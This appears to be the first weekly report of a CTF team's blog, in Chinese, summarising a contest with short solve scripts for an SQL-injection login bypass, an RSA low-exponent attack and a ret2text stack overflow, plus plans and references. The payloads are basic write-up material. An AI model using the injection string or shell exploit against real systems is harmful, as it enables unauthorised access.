---
title: 第 1 期周报：战队集结与本周复盘
date: 2026-09-15 20:00:00
updated: 2026-09-15 20:00:00
categories:
  - 周报
tags:
  - 周报
  - 赛事复盘
  - Writeup
---

这里是战队周报的第一期，先跑通流程，后面每周照这个格式发。

<!-- more -->

## 本周概况

| 项目 | 内容 |
| --- | --- |
| 本周赛事 | 示例杯 CTF 线上赛 |
| 参赛人数 | 5 人 |
| 最终排名 | 第 12 / 486 |
| 解题数 | 7 / 12 |

## 解题情况

### Web — EasySQL

题目给了个登录框，直接拿 `admin' or '1'='1` 试了一下就进去了，属于送分题。

```python
import requests

url = "http://example.com/login"
payload = {"username": "admin' or '1'='1' -- ", "password": "x"}
r = requests.post(url, data=payload)
print(r.text)
```

**考点**：SQL 注入基础、注释符闭合。

### Crypto — RSA 小公钥指数

`e = 3` 且明文很短，直接开三次方就出结果了。

```python
from gmpy2 import iroot

c = 12345678901234567890
m, exact = iroot(c, 3)
print(bytes.fromhex(hex(m)[2:]).decode())
```

**考点**：RSA 低加密指数攻击。

### Pwn — ret2text

栈溢出 + 程序中自带 `system("/bin/sh")`，覆盖返回地址即可。

```python
from pwn import *

io = process("./pwn")
io.sendline(b"A" * 40 + p64(0x4011A6))
io.interactive()
```

## 没做出来的题

**Reverse — maze**：反调试 + 花指令，时间不够，下周继续跟。

## 下周计划

1. 补齐 Reverse 方向的同学，安排一次内部讲题
2. 把战队博客的自动化部署搞完（就是这篇文章所在的站）
3. 报名下周末的 XX 杯

## 参考资料

- [CTF Wiki](https://ctf-wiki.org/)
- [pwntools 文档](https://docs.pwntools.com/)
